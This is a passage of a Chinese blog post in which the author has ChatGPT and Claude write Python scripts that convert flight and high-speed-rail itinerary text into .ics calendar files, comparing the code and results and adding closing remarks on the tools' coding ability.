class="hljs-string">&quot;没有生成任何事件，无法写入到文件&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="3-2-高铁信息"><a href="#3-2-高铁信息" class="headerlink" title="3.2 高铁信息"></a>3.2 高铁信息</h3><p>告知Claude，需要在原代码基础上添加识别高铁信息的功能。</p><p><img src="/../img/%E8%AE%A9Chatgpt%E5%B8%AE%E6%88%91%E5%86%99%E4%BB%A3%E7%A0%81(%E4%B8%80)/image-20230423132937903.png" alt="添加识别高铁信息"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> datetime<br><span class="hljs-keyword">import</span> logging<br><br>ics = <span class="hljs-string">&quot;BEGIN:VCALENDAR\n&quot;</span><br>ics += <span class="hljs-string">&quot;PRODID:transport\n&quot;</span>   <span class="hljs-comment"># 修改为transport</span><br>ics += <span class="hljs-string">&quot;VERSION:2.0\n&quot;</span><br>ics += <span class="hljs-string">&quot;CALSCALE:GREGORIAN\n&quot;</span><br><br>info = []  <br>event_count = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;demo.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    content = f.read().strip()<br>    transports = content.split(<span class="hljs-string">&quot;\n\n&quot;</span>)  <span class="hljs-comment"># 修改为transports</span><br>    <span class="hljs-keyword">for</span> transport <span class="hljs-keyword">in</span> transports:<br>        info = transport.split(<span class="hljs-string">&quot;\n&quot;</span>)<br>        <br>        <span class="hljs-comment"># 判断是航班还是高铁</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;高铁&#x27;</span> <span class="hljs-keyword">in</span> info[<span class="hljs-number">0</span>] <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;动车&#x27;</span> <span class="hljs-keyword">in</span> info[<span class="hljs-number">0</span>]:  <br>           <span class="hljs-comment"># 高铁信息  </span><br>           name = info[<span class="hljs-number">0</span>]<br>           <span class="hljs-comment"># 起始站</span><br>           start_station = info[<span class="hljs-number">1</span>] <br>           <span class="hljs-comment"># 出发时间  </span><br>           depart_time = info[<span class="hljs-number">2</span>]<br>           depart_time = datetime.datetime.strptime(depart_time, <span class="hljs-string">&#x27;%Y/%m/%d %H:%M&#x27;</span>)<br>           <span class="hljs-comment"># 终点站</span><br>           end_station = info[<span class="hljs-number">3</span>] <br>           <span class="hljs-comment"># 到达时间</span><br>           arrive_time = info[<span class="hljs-number">4</span>]<br>           arrive_time = datetime.datetime.strptime(arrive_time, <span class="hljs-string">&#x27;%Y/%m/%d %H:%M&#x27;</span>)           <br>           <br>        <span class="hljs-keyword">else</span>:<br>           <span class="hljs-comment"># 航班信息(代码省略)  </span><br>           ...<br>           <br>        <span class="hljs-comment"># 生成VEVENT事件</span><br>        <span class="hljs-keyword">try</span>:<br>            ics += <span class="hljs-string">f&quot;BEGIN:VEVENT\n&quot;</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;高铁&#x27;</span> <span class="hljs-keyword">in</span> name <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;动车&#x27;</span> <span class="hljs-keyword">in</span> name:  <span class="hljs-comment"># 判断是高铁还是航班</span><br>                ics += <span class="hljs-string">f&quot;UID:<span class="hljs-subst">&#123;name&#125;</span>@<span class="hljs-subst">&#123;start_station&#125;</span>@<span class="hljs-subst">&#123;end_station&#125;</span>\n&quot;</span>  <span class="hljs-comment"># 修改机场为站点          </span><br>            <span class="hljs-keyword">else</span>:<br>                ics += <span class="hljs-string">f&quot;UID:<span class="hljs-subst">&#123;name&#125;</span>@<span class="hljs-subst">&#123;depart_airport&#125;</span>@<span class="hljs-subst">&#123;arrive_airport&#125;</span>\n&quot;</span>  <br>            ...   <span class="hljs-comment"># 其他代码不变</span><br>           <br>            event_count += <span class="hljs-number">1</span>  <br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:  <br>            ...   <span class="hljs-comment"># 日志记录异常代码不变</span><br><br><span class="hljs-comment"># 后续代码不变 </span><br>...<br></code></pre></td></tr></table></figure><p>但一眼看出它将原有的 <strong>ics +&#x3D; “PRODID:flight\n”</strong> 修改为了 <strong>ics +&#x3D; “PRODID:transport\n”</strong></p><p>明显不符合我的要求，于是重新把我的需求告诉它，现在看上去是理解了我的需求了。</p><p><img src="/../img/%E8%AE%A9Chatgpt%E5%B8%AE%E6%88%91%E5%86%99%E4%BB%A3%E7%A0%81(%E4%B8%80)/image-20230423133500216.png" alt="重新说明需求"></p><p>给出代码后还给出了本次代码修改特点，可谓是很贴心了🤣</p><p><img src="/../img/%E8%AE%A9Chatgpt%E5%B8%AE%E6%88%91%E5%86%99%E4%BB%A3%E7%A0%81(%E4%B8%80)/image-20230423133600798.png" alt="修改特点"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> datetime<br><span class="hljs-keyword">import</span> logging<br><br>ics = <span class="hljs-string">&quot;BEGIN:VCALENDAR\n&quot;</span><br>ics += <span class="hljs-string">&quot;PRODID:transport\n&quot;</span>    <br>ics += <span class="hljs-string">&quot;VERSION:2.0\n&quot;</span><br>ics += <span class="hljs-string">&quot;CALSCALE:GREGORIAN\n&quot;</span><br><br>info = []  <br>event_count = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;demo.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    content = f.read().strip()<br>    transports = content.split(<span class="hljs-string">&quot;\n\n&quot;</span>)  <br><br>    <span class="hljs-keyword">for</span> transport <span class="hljs-keyword">in</span> transports:<br>        info = transport.split(<span class="hljs-string">&quot;\n&quot;</span>)<br>        <br>        <span class="hljs-comment"># 先判断是航班还是高铁,然后分别处理</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;高铁&#x27;</span> <span class="hljs-keyword">in</span> info[<span class="hljs-number">0</span>] <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;动车&#x27;</span> <span class="hljs-keyword">in</span> info[<span class="hljs-number">0</span>]:  <br>           <span class="hljs-comment"># 高铁信息  </span><br>           ... <br>        <span class="hljs-keyword">else</span>:<br>           <span class="hljs-comment"># 航班信息 </span><br>           ...  <br><br>        <span class="hljs-comment"># 生成VEVENT事件</span><br>        <span class="hljs-keyword">try</span>:<br>            ics += <span class="hljs-string">f&quot;BEGIN:VEVENT\n&quot;</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;高铁&#x27;</span> <span class="hljs-keyword">in</span> name <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;动车&#x27;</span> <span class="hljs-keyword">in</span> name:  <br>                ics += <span class="hljs-string">f&quot;UID:<span class="hljs-subst">&#123;name&#125;</span>@<span class="hljs-subst">&#123;start_station&#125;</span>@<span class="hljs-subst">&#123;end_station&#125;</span>\n&quot;</span>              <br>            <span class="hljs-keyword">else</span>:<br>                ics += <span class="hljs-string">f&quot;UID:<span class="hljs-subst">&#123;name&#125;</span>@<span class="hljs-subst">&#123;depart_airport&#125;</span>@<span class="hljs-subst">&#123;arrive_airport&#125;</span>\n&quot;</span>  <br>            ...   <span class="hljs-comment"># 其他代码不变</span><br>           <br>            event_count += <span class="hljs-number">1</span>  <br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:  <br>            ...   <span class="hljs-comment"># 日志记录异常代码不变</span><br><br><span class="hljs-comment"># 后续代码不变 </span><br>...<br></code></pre></td></tr></table></figure><p>运行修正后的代码，成功生产ics文件</p><p><img src="/../img/%E8%AE%A9Chatgpt%E5%B8%AE%E6%88%91%E5%86%99%E4%BB%A3%E7%A0%81(%E4%B8%80)/image-20230423134407410.png" alt="Claude生产的ics"></p><h2 id="四、-效果对比"><a href="#四、-效果对比" class="headerlink" title="四、 效果对比"></a>四、 效果对比</h2><p>然后给出与chatgpt生成的ics对比</p><ul><li><p>Claude</p><p><img src="/../img/%E8%AE%A9Chatgpt%E5%B8%AE%E6%88%91%E5%86%99%E4%BB%A3%E7%A0%81(%E4%B8%80)/image-20230423114845740.png" alt="Claude效果"></p></li></ul><p><img src="/../img/%E8%AE%A9Chatgpt%E5%B8%AE%E6%88%91%E5%86%99%E4%BB%A3%E7%A0%81(%E4%B8%80)/image-20230423114918310.png" alt="Chatgpt效果"></p><h3 id="4-1-最终代码"><a href="#4-1-最终代码" class="headerlink" title="4.1 最终代码"></a>4.1 最终代码</h3><p>贴上Chatgpt和Claude生成的代码</p><h4 id="4-1-1-Chatgpt"><a href="#4-1-1-Chatgpt" class="headerlink" title="4.1.1 Chatgpt"></a>4.1.1 Chatgpt</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime, timedelta<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">convert_to_ics</span>(<span class="hljs-params">travel_info</span>):<br>    regex = <span class="hljs-string">r&quot;(\S+)\s+(\S+)\s+出发时间\s+(\S+\s+\S+)\s+(\S+)\s+达到时间\s+(\S+\s+\S+)&quot;</span><br>    train_regex = <span class="hljs-string">r&quot;(\S+)\s+(\S+)\s+出发时间\s+(\S+\s+\S+)\s+(\S+)\s+到达时间\s+(\S+\s+\S+)&quot;</span><br>    <span class="hljs-keyword">match</span> = re.search(regex, travel_info)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span> <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">match</span> = re.search(train_regex, travel_info)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span> <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Error: failed to match travel information.&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>        travel_type = <span class="hljs-string">&quot;高铁/动车&quot;</span><br>        train_no, dep_station, dep_time, arr_station, arr_time = <span class="hljs-keyword">match</span>.groups()<br>    <span class="hljs-keyword">else</span>:<br>        travel_type = <span class="hljs-string">&quot;航班&quot;</span><br>        airline, dep_airport, dep_time, arr_airport, arr_time = <span class="hljs-keyword">match</span>.groups()<br><br>    <span class="hljs-comment"># 生成ICS字符串</span><br>    start_time = datetime.strptime(dep_time, <span class="hljs-string">&#x27;%Y/%m/%d %H:%M&#x27;</span>)<br>    end_time = datetime.strptime(arr_time, <span class="hljs-string">&#x27;%Y/%m/%d %H:%M&#x27;</span>)<br>    uid = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;travel_type&#125;</span>-<span class="hljs-subst">&#123;start_time.date()&#125;</span>&#x27;</span><br>    <span class="hljs-keyword">if</span> travel_type == <span class="hljs-string">&quot;航班&quot;</span>:<br>        summary = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;airline&#125;</span> <span class="hljs-subst">&#123;uid&#125;</span>&#x27;</span><br>        location = dep_airport<br>        description = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;airline&#125;</span> 将于<span class="hljs-subst">&#123;dep_time&#125;</span>从<span class="hljs-subst">&#123;dep_airport&#125;</span>出发，预计于<span class="hljs-subst">&#123;arr_time&#125;</span>到达<span class="hljs-subst">&#123;arr_airport&#125;</span>。&#x27;</span><br>    <span class="hljs-keyword">elif</span> travel_type == <span class="hljs-string">&quot;高铁/动车&quot;</span>:<br>        summary = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;train_no&#125;</span> <span class="hljs-subst">&#123;uid&#125;</span>&#x27;</span><br>        location = dep_station<br>        description = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;train_no&#125;</span> 将于<span class="hljs-subst">&#123;dep_time&#125;</span>从<span class="hljs-subst">&#123;dep_station&#125;</span>出发，预计于<span class="hljs-subst">&#123;arr_time&#125;</span>到达<span class="hljs-subst">&#123;arr_station&#125;</span>。&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;Unknown travel type.&quot;</span>)<br><br>    ics_str = <span class="hljs-string">f&#x27;BEGIN:VCALENDAR\nVERSION:2.0\nPRODID:-//ChatGPT//Travel Schedule//EN\nBEGIN:VEVENT\nUID:<span class="hljs-subst">&#123;uid&#125;</span>\nDTSTAMP:<span class="hljs-subst">&#123;datetime.utcnow().strftime(<span class="hljs-string">&quot;%Y%m%dT%H%M%SZ&quot;</span>)&#125;</span>\nDTSTART;TZID=Asia/Shanghai:<span class="hljs-subst">&#123;start_time.strftime(<span class="hljs-string">&quot;%Y%m%dT%H%M%S&quot;</span>)&#125;</span>\nDTEND;TZID=Asia/Shanghai:<span class="hljs-subst">&#123;end_time.strftime(<span class="hljs-string">&quot;%Y%m%dT%H%M%S&quot;</span>)&#125;</span>\nSUMMARY:<span class="hljs-subst">&#123;summary&#125;</span>\nLOCATION:<span class="hljs-subst">&#123;location&#125;</span>\nDESCRIPTION:<span class="hljs-subst">&#123;description&#125;</span>\nEND:VEVENT\nEND:VCALENDAR&#x27;</span><br><br>    <span class="hljs-keyword">return</span> ics_str<br><br><br><span class="hljs-comment"># 读取行程信息</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;Flight.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    travel_info = f.read()<br><br><span class="hljs-comment"># 转换为ICS字符串</span><br>ics_str = convert_to_ics(travel_info)<br><br><span class="hljs-comment"># 将ICS字符串写入文件</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;result.ics&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(ics_str)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;转换完成！请查看对应目录的result.ics文件&#x27;</span>)<br><br></code></pre></td></tr></table></figure><p>Flight.txt的格式</p><ul><li>航班信息</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">厦门航空 MF8415<br>杭州萧山机场T3<br>出发时间 <span class="hljs-number">2023</span><span class="hljs-regexp">/05/</span><span class="hljs-number">04</span> <span class="hljs-number">15</span>:<span class="hljs-number">20</span><br>重庆江北机场T3<br>到达时间 <span class="hljs-number">2023</span><span class="hljs-regexp">/05/</span><span class="hljs-number">04</span> <span class="hljs-number">17</span>:<span class="hljs-number">45</span><br></code></pre></td></tr></table></figure><ul><li>高铁信息</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">高铁/动车 G158<br>杭州东站<br>出发时间 <span class="hljs-number">2023</span><span class="hljs-regexp">/05/</span><span class="hljs-number">04</span> <span class="hljs-number">16</span>:<span class="hljs-number">13</span><br>上海虹桥站<br>到达时间 <span class="hljs-number">2023</span><span class="hljs-regexp">/05/</span><span class="hljs-number">04</span> <span class="hljs-number">17</span>:<span class="hljs-number">12</span><br></code></pre></td></tr></table></figure><h4 id="4-1-2-Claude"><a href="#4-1-2-Claude" class="headerlink" title="4.1.2 Claude"></a>4.1.2 Claude</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> datetime<br><span class="hljs-keyword">import</span> logging<br><br>ics = <span class="hljs-string">&quot;BEGIN:VCALENDAR\n&quot;</span><br>ics += <span class="hljs-string">&quot;PRODID:transport\n&quot;</span><br>ics += <span class="hljs-string">&quot;VERSION:2.0\n&quot;</span><br>ics += <span class="hljs-string">&quot;CALSCALE:GREGORIAN\n&quot;</span><br><br>info = []<br>event_count = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;demo.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    content = f.read().strip()<br>    transports = content.split(<span class="hljs-string">&quot;\n\n&quot;</span>)<br><br>    <span class="hljs-keyword">for</span> transport <span class="hljs-keyword">in</span> transports:<br>        info = transport.split(<span class="hljs-string">&quot;\n&quot;</span>)<br><br>        <span class="hljs-comment"># 先判断是航班还是高铁,然后分别处理</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;高铁&#x27;</span> <span class="hljs-keyword">in</span> info[<span class="hljs-number">0</span>] <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;动车&#x27;</span> <span class="hljs-keyword">in</span> info[<span class="hljs-number">0</span>]:<br>            <span class="hljs-comment"># 高铁信息</span><br>            name = info[<span class="hljs-number">0</span>]<br>            <span class="hljs-comment"># 起始站</span><br>            start_station = info[<span class="hljs-number">1</span>]<br>            <span class="hljs-comment"># 出发时间</span><br>            depart_time = info[<span class="hljs-number">2</span>]<br>            depart_time = datetime.datetime.strptime(depart_time, <span class="hljs-string">&#x27;%Y/%m/%d %H:%M&#x27;</span>)<br>            <span class="hljs-comment"># 终点站</span><br>            end_station = info[<span class="hljs-number">3</span>]<br>            <span class="hljs-comment"># 到达时间</span><br>            arrive_time = info[<span class="hljs-number">4</span>]<br>            arrive_time = datetime.datetime.strptime(arrive_time, <span class="hljs-string">&#x27;%Y/%m/%d %H:%M&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># 航班信息</span><br>            flight_info = transport.split(<span class="hljs-string">&quot;\n&quot;</span>)<br>            name = flight_info[<span class="hljs-number">0</span>]<br>            <span class="hljs-comment"># 解析出机场和时间信息</span><br>            airport = flight_info[<span class="hljs-number">1</span>].split(<span class="hljs-string">&#x27; &#x27;</span>)<br>            depart_airport = <span class="hljs-string">&#x27; &#x27;</span>.join(airport[:<span class="hljs-number">2</span>])<br><br>            depart_time = flight_info[<span class="hljs-number">2</span>]<br>            depart_time = datetime.datetime.strptime(depart_time, <span class="hljs-string">&#x27;%Y-%m-%d %H:%M&#x27;</span>)<br><br>            airport = flight_info[<span class="hljs-number">3</span>].split(<span class="hljs-string">&#x27; &#x27;</span>)<br>            arrive_airport = <span class="hljs-string">&#x27; &#x27;</span>.join(airport[:<span class="hljs-number">2</span>])<br><br>            arrive_time = flight_info[<span class="hljs-number">4</span>]<br>            arrive_time = datetime.datetime.strptime(arrive_time, <span class="hljs-string">&#x27;%Y-%m-%d %H:%M&#x27;</span>)<br><br>            <span class="hljs-comment"># 生成VEVENT事件</span><br>        <span class="hljs-keyword">try</span>:<br>            ics += <span class="hljs-string">f&quot;BEGIN:VEVENT\n&quot;</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;高铁&#x27;</span> <span class="hljs-keyword">in</span> name <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;动车&#x27;</span> <span class="hljs-keyword">in</span> name:<br>                ics += <span class="hljs-string">f&quot;UID:<span class="hljs-subst">&#123;name&#125;</span>@<span class="hljs-subst">&#123;start_station&#125;</span>@<span class="hljs-subst">&#123;end_station&#125;</span>\n&quot;</span><br>            <span class="hljs-keyword">else</span>:<br>                ics += <span class="hljs-string">f&quot;UID:<span class="hljs-subst">&#123;name&#125;</span>@<span class="hljs-subst">&#123;depart_airport&#125;</span>@<span class="hljs-subst">&#123;arrive_airport&#125;</span>\n&quot;</span><br>            ics += <span class="hljs-string">f&quot;DTSTART;TZID=Asia/Shanghai:<span class="hljs-subst">&#123;depart_time.strftime(<span class="hljs-string">&#x27;%Y%m%dT%H%M%S&#x27;</span>)&#125;</span>\n&quot;</span><br>            ics += <span class="hljs-string">f&quot;DTEND;TZID=Asia/Shanghai:<span class="hljs-subst">&#123;arrive_time.strftime(<span class="hljs-string">&#x27;%Y%m%dT%H%M%S&#x27;</span>)&#125;</span>\n&quot;</span><br>            ics += <span class="hljs-string">f&quot;SUMMARY:<span class="hljs-subst">&#123;name&#125;</span>\n&quot;</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;高铁&#x27;</span> <span class="hljs-keyword">in</span> name <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;动车&#x27;</span> <span class="hljs-keyword">in</span> name:<br>                ics += <span class="hljs-string">f&quot;LOCATION:<span class="hljs-subst">&#123;start_station&#125;</span> -&gt; <span class="hljs-subst">&#123;end_station&#125;</span>\n&quot;</span><br>            <span class="hljs-keyword">else</span>:<br>                ics += <span class="hljs-string">f&quot;LOCATION:<span class="hljs-subst">&#123;depart_airport&#125;</span> -&gt; <span class="hljs-subst">&#123;arrive_airport&#125;</span>\n&quot;</span><br>            ics += <span class="hljs-string">&quot;END:VEVENT\n&quot;</span><br>            event_count += <span class="hljs-number">1</span><br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;生成VEVENT失败:<span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>            logging.exception(e)<br><br>ics += <span class="hljs-string">&quot;END:VCALENDAR&quot;</span><br><br><span class="hljs-comment"># 如果成功生成了至少一个事件,就写入文件</span><br><span class="hljs-keyword">if</span> event_count &gt; <span class="hljs-number">0</span>:<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;result.ics&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(ics)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;没有生成任何事件,无法写入到文件&quot;</span>)<br></code></pre></td></tr></table></figure><p>Demo.txt 格式</p><ul><li>航班信息</li></ul><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs txt">厦门航空 MF8415<br>杭州萧山机场T3<br>2023-05-04 15:20<br>重庆江北机场T3<br>2023-05-04 17:45<br></code></pre></td></tr></table></figure><ul><li>高铁信息</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">高铁 G158<br>杭州东站<br><span class="hljs-number">2023</span><span class="hljs-regexp">/05/</span><span class="hljs-number">04</span> <span class="hljs-number">16</span>:<span class="hljs-number">13</span><br>上海虹桥站<br><span class="hljs-number">2023</span><span class="hljs-regexp">/05/</span><span class="hljs-number">04</span> <span class="hljs-number">17</span>:<span class="hljs-number">12</span><br></code></pre></td></tr></table></figure><h2 id="五-、-最后"><a href="#五-、-最后" class="headerlink" title="五 、 最后"></a>五 、 最后</h2><p>整个过程中因为我不想自己去手动调整代码，直接以命令口吻要求Chatgpt和Claude帮我写，如果报错或者输出结果不对，就把结果和错误发送回去，让它继续优化，直到达到自己想要的目的。 因为本人用的gpt3.5 和 Claude，编码能力不及gpt4.0；所以替我写好的代码需要重复调整，在这个上面花费的时间有点多（当然也有我自己写错配置的原因，比如<strong>到达</strong>写成<strong>达到</strong>，chatgpt第二次给我指正这个问题时候我才发现🤣）</p><p>目前代码需要自己在txt文件中添加航班或者高铁信息，还有优化的空间。</p><h3 id="5-1-一些小问题"><a href="#5-1-一些小问题" class="headerlink" title="5.1 一些小问题"></a>5.1 一些小问题</h3><p>在使用Keepchatgpt插件的时候，chatgpt发过来的代码还是会出现中断的情况，但是不会出现报错提示了。此时就需要提升chatgpt 代码没发完整，需要重新发。</p><p><img src="/../img/%E8%AE%A9Chatgpt%E5%B8%AE%E6%88%91%E5%86%99%E4%BB%A3%E7%A0%81(%E4%B8%80)/image-20230423004643663.png" alt="chatgpt回复出现中断"></p><h3 id="5-2-代码能力："><a href="#5-2-代码能力：" class="headerlink" title="5.2 代码能力："></a>5.2 <strong>代码能力</strong>：</h3><p>gpt 4.0 &gt;&gt; gpt 3.5 &gt; Claude</p><h3 id="5-3-注意-⚠️"><a href="#5-3-注意-⚠️" class="headerlink" title="5.3 注意 ⚠️"></a>5.3 注意 ⚠️</h3><p>本次只是一个小脚本，信息就是个人的出行信息。不涉及敏感信息，但还是要强调一点：不要在chatgpt上发送有关企业内部代码和敏感涉密代码。信息安全是重中之重！！！</p><p>想吐槽携程啥时候能把这个行程信息同步功能重新上线….😶‍🌫️</p><h2 id="六、参考来源"><a 